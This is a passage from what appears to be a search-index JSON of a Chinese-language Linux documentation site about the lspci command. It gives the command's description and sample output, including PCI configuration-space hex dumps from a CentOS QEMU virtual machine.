\u5728\u8bb8\u591a\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u5bf9PCI\u914d\u7f6e\u7a7a\u95f4\u7684\u67d0\u4e9b\u90e8\u5206\u7684\u8bbf\u95ee\u4ec5\u9650\u4e8eroot\u7528\u6237\uff0c\u56e0\u6b64lspci\u5bf9\u666e\u901a\u7528\u6237\u53ef\u7528\u7684\u529f\u80fd\u53d7\u5230\u9650\u5236\u3002\u7136\u800c\uff0clspci\u5c3d\u53ef\u80fd\u591a\u5730\u663e\u793a\u53ef\u7528\u4fe1\u606f\uff0c\u5e76\u7528 \u6587\u672c\u6807\u8bb0\u6240\u6709\u5176\u4ed6\u4fe1\u606f\u3002 lspci linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) lspci\uff088\uff09\uff1a \u6240\u6709 PCI \u8bbe\u5907 - Linux \u624b\u518c\u9875 (die.net) [root@VM-0-16-centos ~]# lspci -tv -[0000:00]-+-00.0 Intel Corporation 440FX - 82441FX PMC [Natoma] +-01.0 Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II] +-01.1 Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II] +-01.2 Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] +-01.3 Intel Corporation 82371AB/EB/MB PIIX4 ACPI +-02.0 Cirrus Logic GD 5446 +-03.0-[01]-- +-04.0-[02]-- +-05.0 Red Hat, Inc. Virtio network device +-06.0 Red Hat, Inc. Virtio block device +-07.0 Red Hat, Inc. Virtio block device \\-08.0 Red Hat, Inc. Virtio memory balloon [root@VM-0-16-centos ~]# lspci |grep -i eth 00:05.0 Ethernet controller: Red Hat, Inc. Virtio network device [root@VM-0-16-centos ~]# lspci -vvxxx 00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02) Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- 00: 86 80 37 12 03 01 00 00 02 00 00 06 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 ff 00 10 11 11 11 11 11 31 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II] Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=medium >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- 00: 86 80 00 70 03 01 00 02 00 00 01 06 00 00 80 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 4d 00 03 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 0a 0a 0b 0b 00 00 00 00 00 02 00 00 00 00 00 00 70: 80 00 00 00 00 00 0c 0c 02 00 00 00 00 00 00 00 80: 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 08 00 00 00 00 00 00 00 0f 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II] (prog-if 80 [ISA Compatibility mode-only controller, supports bus mastering]) Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B+ ParErr- DEVSEL=medium >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Region 0: [virtual] Memory at 000001f0 (32-bit, non-prefetchable) [size=8] Region 1: [virtual] Memory at 000003f0 (type 3, non-prefetchable) Region 2: [virtual] Memory at 00000170 (32-bit, non-prefetchable) [size=8] Region 3: [virtual] Memory at 00000370 (type 3, non-prefetchable) Region 4: I/O ports at e100 [size=16] Kernel driver in use: ata_piix Kernel modules: ata_piix, pata_acpi, ata_generic 00: 86 80 10 70 07 01 80 02 00 80 01 01 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 01 e1 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40: 30 c0 00 c0 0b 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01) (prog-if 00 [UHCI]) Subsystem: Red Hat, Inc. QEMU Virtual Machine Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin D routed to IRQ 11 Region 4: I/O ports at e0c0 [size=32] Kernel driver in use: uhci_hcd 00: 86 80 20 70 07 01 00 00 01 00 03 0c 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: c1 e0 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 0b 04 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 10 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03) Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B+ ParErr- DEVSEL=medium >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Interrupt: pin A routed to IRQ 9 Kernel driver in use: piix4_smbus Kernel modules: i2c_piix4 00: 86 80 13 71 03 01 80 02 03 00 80 06 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 09 01 00 00 40: 01 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 10 60: 00 00 00 60 00 00 00 08 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 01 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 09 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:02.0 VGA compatible controller: Cirrus Logic GD 5446 (prog-if 00 [VGA controller]) Subsystem: Red Hat, Inc. QEMU Virtual Machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Region 0: Memory at fc000000 (32-bit, prefetchable) [size=32M] Region 1: Memory at fea20000 (32-bit, non-prefetchable) [size=4K] Expansion ROM at fea00000 [disabled] [size=64K] Kernel driver in use: cirrus Kernel modules: cirrus 00: 13 10 b8 00 03 01 00 00 00 00 00 03 00 00 00 00 10: 08 00 00 fc 00 00 a2 fe 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 a0 fe 00 00 00 00 00 00 00 00 00 00 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:03.0 PCI bridge: Red Hat, Inc. QEMU PCI-PCI bridge (prog-if 00 [Normal decode]) Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap+ 66MHz+ UDF- FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Interrupt: pin A routed to IRQ 11 Region 0: Memory at fea21000 (64-bit, non-prefetchable) [size=256] Bus: primary=00, secondary=01, subordinate=01, sec-latency=0 I/O behind bridge: 0000d000-0000dfff Memory behind bridge: fe800000-fe9fffff Prefetchable memory behind bridge: 00000000fe200000-00000000fe3fffff Secondary status: 66MHz+ FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- <SERR- <PERR- BridgeCtl: Parity- SERR+ NoISA- VGA- MAbort- >Reset- FastB2B- PriDiscTmr- SecDiscTmr- DiscTmrStat- DiscTmrSERREn- Capabilities: [4c] MSI: Enable- Count=1/1 Maskable+ 64bit+ Address: 0000000000000000 Data: 0000 Masking: 00000000 Pending: 00000000 Capabilities: [48] Slot ID: 0 slots, First+, chassis 01 Capabilities: [40] Hot-plug capable 00: 36 1b 01 00 03 01 b0 00 00 00 04 06 00 00 01 00 10: 04 10 a2 fe 00 00 00 00 00 01 01 00 d0 d0 a0 00 20: 80 fe 90 fe 21 fe 31 fe 00 00 00 00 00 00 00 00 30: 00 00 00 00 4c 00 00 00 00 00 00 00 0b 01 02 00 40: 0c 00 00 00 00 00 00 00 04 40 20 01 05 48 80 01 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:04.0 PCI bridge: Red Hat, Inc. QEMU PCI-PCI bridge (prog-if 00 [Normal decode]) Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap+ 66MHz+ UDF- FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Interrupt: pin A routed to IRQ 11 Region 0: Memory at fea22000 (64-bit, non-prefetchable) [size=256] Bus: primary=00, secondary=02, subordinate=02, sec-latency=0 I/O behind bridge: 0000c000-0000cfff Memory behind bridge: fe600000-fe7fffff Prefetchable memory behind bridge: 00000000fe000000-00000000fe1fffff Secondary status: 66MHz+ FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- <SERR- <PERR- BridgeCtl: Parity- SERR+ NoISA- VGA- MAbort- >Reset- FastB2B- PriDiscTmr- SecDiscTmr- DiscTmrStat- DiscTmrSERREn- Capabilities: [4c] MSI: Enable- Count=1/1 Maskable+ 64bit+ Address: 0000000000000000 Data: 0000 Masking: 00000000 Pending: 00000000 Capabilities: [48] Slot ID: 0 slots, First+, chassis 02 Capabilities: [40] Hot-plug capable 00: 36 1b 01 00 03 01 b0 00 00 00 04 06 00 00 01 00 10: 04 20 a2 fe 00 00 00 00 00 02 02 00 c0 c0 a0 00 20: 60 fe 70 fe 01 fe 11 fe 00 00 00 00 00 00 00 00 30: 00 00 00 00 4c 00 00 00 00 00 00 00 0b 01 02 00 40: 0c 00 00 00 00 00 00 00 04 40 20 02 05 48 80 01 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:05.0 Ethernet controller: Red Hat, Inc. Virtio network device Subsystem: Red Hat, Inc. Device 0001 Physical Slot: 5 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx+ Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 10 Region 0: I/O ports at e000 [size=64] Region 1: Memory at fea23000 (32-bit, non-prefetchable) [size=4K] Region 4: Memory at fe400000 (64-bit, prefetchable) [size=16K] Expansion ROM at fea10000 [disabled] [size=64K] Capabilities: [98] MSI-X: Enable+ Count=6 Masked- Vector table: BAR=1 offset=00000000 PBA: BAR=1 offset=00000800 Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 00 10 07 05 10 00 00 00 00 02 00 00 00 00 10: 01 e0 00 00 00 30 a2 fe 00 00 00 00 00 00 00 00 20: 0c 00 40 fe 00 00 00 00 00 00 00 00 f4 1a 01 00 30: 00 00 a1 fe 98 00 00 00 00 00 00 00 0a 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 11 84 05 80 01 00 00 00 a0: 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:06.0 SCSI storage controller: Red Hat, Inc. Virtio block device Subsystem: Red Hat, Inc. Device 0002 Physical Slot: 6 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx+ Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 10 Region 0: I/O ports at e040 [size=64] Region 1: Memory at fea24000 (32-bit, non-prefetchable) [size=4K] Region 4: Memory at fe404000 (64-bit, prefetchable) [size=16K] Capabilities: [98] MSI-X: Enable+ Count=2 Masked- Vector table: BAR=1 offset=00000000 PBA: BAR=1 offset=00000800 Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 01 10 07 05 10 00 00 00 00 01 00 00 00 00 10: 41 e0 00 00 00 40 a2 fe 00 00 00 00 00 00 00 00 20: 0c 40 40 fe 00 00 00 00 00 00 00 00 f4 1a 02 00 30: 00 00 00 00 98 00 00 00 00 00 00 00 0a 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 11 84 01 80 01 00 00 00 a0: 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:07.0 SCSI storage controller: Red Hat, Inc. Virtio block device Subsystem: Red Hat, Inc. Device 0002 Physical Slot: 7 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx+ Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 11 Region 0: I/O ports at e080 [size=64] Region 1: Memory at fea25000 (32-bit, non-prefetchable) [size=4K] Region 4: Memory at fe408000 (64-bit, prefetchable) [size=16K] Capabilities: [98] MSI-X: Enable+ Count=2 Masked- Vector table: BAR=1 offset=00000000 PBA: BAR=1 offset=00000800 Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 01 10 07 05 10 00 00 00 00 01 00 00 00 00 10: 81 e0 00 00 00 50 a2 fe 00 00 00 00 00 00 00 00 20: 0c 80 40 fe 00 00 00 00 00 00 00 00 f4 1a 02 00 30: 00 00 00 00 98 00 00 00 00 00 00 00 0b 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 11 84 01 80 01 00 00 00 a0: 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:08.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon Subsystem: Red Hat, Inc. Device 0005 Physical Slot: 8 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 11 Region 0: I/O ports at e0e0 [size=32] Region 4: Memory at fe40c000 (64-bit, prefetchable) [size=16K] Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 02 10 07 01 10 00 00 00 ff 00 00 00 00 00 10: e1 e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 0c c0 40 fe 00 00 00 00 00 00 00 00 f4 1a 05 00 30: 00 00 00 00 84 00 00 00 00 00 00 00 0b 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00","title":"lspci\u547d\u4ee4"},{"location":"system/linux/IO/lspci/#lspci","text":"lspci\u662f\u4e00\u4e2a\u5b9e\u7528\u7a0b\u5e8f\uff0c\u7528\u4e8e\u663e\u793a\u7cfb\u7edf\u4e2dPCI\u603b\u7ebf\u53ca\u5176\u8fde\u63a5\u8bbe\u5907\u7684\u4fe1\u606f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b83\u663e\u793a\u8bbe\u5907\u7684\u7b80\u77ed\u5217\u8868\u3002\u4f7f\u7528\u4e0b\u9762\u63cf\u8ff0\u7684\u9009\u9879\u6765\u8bf7\u6c42\u66f4\u8be6\u7ec6\u7684\u8f93\u51fa\u6216\u7528\u4e8e\u5176\u4ed6\u7a0b\u5e8f\u89e3\u6790\u7684\u8f93\u51fa\u3002 \u5982\u679c\u60a8\u8981\u62a5\u544aPCI\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u6216lspci\u672c\u8eab\u4e2d\u7684\u9519\u8bef\uff0c\u8bf7\u5305\u62ec\u201clspci-vvx\u201d\u6216\u66f4\u597d\u7684\u201clspci-vvxxx\u201d\u7684\u8f93\u51fa\uff08\u4f46\u662f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u53ef\u80fd\u7684\u6ce8\u610f\u4e8b\u9879\uff09\u3002 \u8f93\u51fa\u7684\u67d0\u4e9b\u90e8\u5206\uff0c\u5c24\u5176\u662f\u5728\u9ad8\u5ea6\u5197\u957f\u7684\u6a21\u5f0f\u4e0b\uff0c\u53ef\u80fd\u53ea\u6709\u7ecf\u9a8c\u4e30\u5bcc\u7684PCI\u9ed1\u5ba2\u624d\u80fd\u7406\u89e3\u3002\u6709\u5173\u5b57\u6bb5\u7684\u786e\u5207\u5b9a\u4e49\uff0c\u8bf7\u53c2\u9605PCI\u89c4\u8303\u6216header.h\u548c/usr/include/linux/PCI.h include\u6587\u4ef6\u3002 \u5728\u8bb8\u591a\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u5bf9PCI\u914d\u7f6e\u7a7a\u95f4\u7684\u67d0\u4e9b\u90e8\u5206\u7684\u8bbf\u95ee\u4ec5\u9650\u4e8eroot\u7528\u6237\uff0c\u56e0\u6b64lspci\u5bf9\u666e\u901a\u7528\u6237\u53ef\u7528\u7684\u529f\u80fd\u53d7\u5230\u9650\u5236\u3002\u7136\u800c\uff0clspci\u5c3d\u53ef\u80fd\u591a\u5730\u663e\u793a\u53ef\u7528\u4fe1\u606f\uff0c\u5e76\u7528 \u6587\u672c\u6807\u8bb0\u6240\u6709\u5176\u4ed6\u4fe1\u606f\u3002 lspci linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) lspci\uff088\uff09\uff1a \u6240\u6709 PCI \u8bbe\u5907 - Linux \u624b\u518c\u9875 (die.net) [root@VM-0-16-centos ~]# lspci -tv -[0000:00]-+-00.0 Intel Corporation 440FX - 82441FX PMC [Natoma] +-01.0 Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II] +-01.1 Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II] +-01.2 Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] +-01.3 Intel Corporation 82371AB/EB/MB PIIX4 ACPI +-02.0 Cirrus Logic GD 5446 +-03.0-[01]-- +-04.0-[02]-- 